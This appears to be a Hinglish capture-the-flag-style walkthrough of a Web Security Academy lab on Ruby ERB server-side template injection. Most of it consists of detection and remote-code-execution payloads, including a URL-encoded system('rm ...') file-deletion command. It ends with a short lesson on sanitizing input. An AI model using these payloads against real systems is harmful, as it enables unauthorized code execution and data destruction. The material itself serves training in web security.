### 🟢 Step 1: Lab ko samajhna

* Yeh lab **ERB (Embedded Ruby)** templates use kar raha hai.
* Jab tum `message` parameter bhejte ho URL mein, woh template ke andar directly evaluate hota hai.
* Matlab agar tum ne koi Ruby code diya, woh execute ho jayega. Yeh hi vulnerability hai → **Server-Side Template Injection (SSTI).**

---

### 🟢 Step 2: Test karna ke injection possible hai

1. Ek normal request maro:

   ```
   https://YOUR-LAB-ID.web-security-academy.net/?message=hello
   ```

   Page pe “hello” dikh raha hoga.

2. Ab ek test payload lagao:

   ```
   <%= 7*7 %>
   ```

   Isko URL encode karo → `<%25%3d+7*7+%25>`

   Request bano:

   ```
   https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>
   ```

   Agar page pe **49** dikh gaya, iska matlab tumhara code execute ho raha hai ✅

---

### 🟢 Step 3: Arbitrary command execution ka method

* Ruby mein `system("command")` OS ka command chalata hai.
* Matlab ab tum direct server pe commands run kar sakte ho.

---

### 🟢 Step 4: Target ko delete karna

Lab instruction ke mutabiq hume `morale.txt` delete karna hai jo Carlos ke home directory mein hai:

```
/home/carlos/morale.txt
```

Payload banate hain:

```ruby
<%= system("rm /home/carlos/morale.txt") %>
```

Isko URL encode karo →

```
<%25+system("rm+/home/carlos/morale.txt")+%25>
```

Final URL:

```
https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```

Browser mein open karo. File delete ho jaayegi aur lab **Solved** dikhayega ✅

---

### 🟢 Step 5: Important lesson

1. Jab bhi templates insecurely use hoon (user input directly inject), toh **RCE (Remote Code Execution)** ho sakta hai.
2. Developer ki galti yeh thi ke unhone user input sanitize nahi kiya aur usko ERB engine ko directly de diya.
3. Yeh SSTI bug **real-world** mein kaafi dangerous hota hai, kyunki isse attacker server par kuch bhi run kar sakta hai.
